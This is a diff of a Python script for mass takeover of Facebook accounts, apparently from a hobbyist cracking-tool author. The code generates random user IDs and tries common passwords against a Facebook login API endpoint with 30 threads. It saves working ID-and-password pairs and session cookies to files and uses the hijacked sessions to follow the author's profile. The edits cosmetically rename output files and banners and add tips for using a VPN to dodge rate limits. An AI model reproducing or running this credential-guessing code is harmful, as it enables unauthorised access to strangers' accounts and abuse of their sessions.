@@ -46,7 +46,7 @@ os.system("espeak -a 300 \"Checking,Update,\"")
 time.sleep(2)
 #os.system('clear')
 print('\033[91;1m[\x1b[31;5;50m+\033[91;1m] \x1b[31;5;50mUPDATE VERSHON 0.5...! ')
-os.system("espeak -a 300 \"UPDATE VERSION 0.5,\"")
+os.system("espeak -a 300 \"UPDATE VERSION 0.1,\"")
 time.sleep(2)
 #os.system('clear')
 print("\033[95;1m[\x1b[35;5;50m+\033[97;1m]\x1b[35;5;50m BEST COMMAND FOR CLONING ALL COUNTRY WIFI + DATA BOTH WORKING..!")
@@ -400,7 +400,7 @@ def crack(idf,pwv):
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ SYK-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ SYK-OK-FIRE🔥 ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
 				open('/sdcard/ids/ok.txt','a').write('%s\n' % wrt)
@@ -438,10 +438,10 @@ def free(idf,pwv):
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ SYK-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ SYK-OK-FIRE🔥 ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/SYK-OK.txt','a').write('%s\n' % wrt)
+				open('/sdcard/SYK-OK-FIRE🔥.txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
 
@@ -456,40 +456,19 @@ def follow(ses,coki):
 	get = r.find('a', string='Follow').get('href')
 	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
 
-logo = ("""\033[1;32m
+logo ="""
        
 
-███████╗██╗   ██╗██╗  ██╗███████╗
-██╔════╝╚██╗ ██╔╝██║ ██╔╝██╔════╝
-███████╗ ╚████╔╝ █████╔╝ ███████╗
-╚════██║  ╚██╔╝  ██╔═██╗ ╚════██║
-███████║   ██║   ██║  ██╗███████║
-╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝
-                                 
-                                 
-                                 
-                                 
-                                 
-                                 
-                                 
-                                 
-                                 
-                                 
-                                 
-                                 
-                                 
-                                 
-                                 
-                                            \033
-__________________×______________________
-  
-  Auther   :  Soyek Fxz香.
- 
-  Github   :  soyekxddd
-
-  Facebook: Soyek Inxide.    (80% Ok Account Open Just Now)❤️
-
-__________________×______________________\033[1;37m""")
+               ____ 
+  _________  _/_   |
+ /  ___/\  \/ /|   |
+ \___ \  \   / |   |\033[38;5;196m•->\033[1;37m AAUTHOR : Soyek Fxz香.
+/____  >  \_/  |___|\033[38;5;196m •->\033[1;37m GITHUUB : soyekxddd
+     \/             \033[38;5;196m •->\033[1;37m VERSION :\033[38;5;196m v/0.1
+\033[1;37;1m---------------------------------------------------
+Soy3k Fuck3r 1nx1d3'w -                              
+\033[1;37m\033[1;37m---------------------------------------------------"""                                 
+                    
 
 class Main:
 	def __init__(self):
@@ -529,7 +508,7 @@ class Main:
 		xx = 999999999
 		idx = "100000" 
 		os.system('clear');print(logo)
-		limit = int(input(" \n\033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
+		limit = int(input(" \n\033[38;5;196m[+]\033[1;37m TOTAL IDS TO CRACK LIMIT 50,000: "))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
@@ -538,7 +517,7 @@ class Main:
 			
 			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n\033[1;32m [!] USE (123456) FOR IDZ\033[1;37m ")
+				print("\n\033[1;32m [!] USE (123456,1234567,12345678,123456789) FOR IDZ\033[1;37m ")
 				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
 				if len(listpass)<=5:
 					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
@@ -547,7 +526,7 @@ class Main:
 				print(logo)
 				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(Y))
 				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(G))
-				print("%s [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(P))
+				print("%s [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS 𝗨𝗦𝗘 1.1.1.1 𝗩𝗣𝗡 𝗢𝗥 𝗦𝗜𝗡𝗚𝗔𝗣𝗢𝗥𝗘 𝗦𝗘𝗥𝗩𝗘𝗥2 𝗙𝗢𝗥 𝗕𝗘𝗦𝗧 𝗥𝗘𝗦𝗨𝗟𝗧𝗦\x1b[0m\n"%(P))
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
 			exit("\n\n [>>] CRACK COMPLETE...")
@@ -936,15 +915,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ SYK-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ SYK-OK-FIRE🔥 ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-SYK-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-SYK-OK-FIRE🔥.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
 				print("\r \033[0;92m[ ANMOL-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-SYK-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-SYK-OK-FIRE🔥.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1363,15 +1342,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ SYK-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ SYK-OK-FIRE🔥 ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-SYK-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-SYK-OK-FIRE🔥.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ SYK-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ SYK-OK-FIRE🔥 ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-SYK-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-SYK-OK-FIRE🔥.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
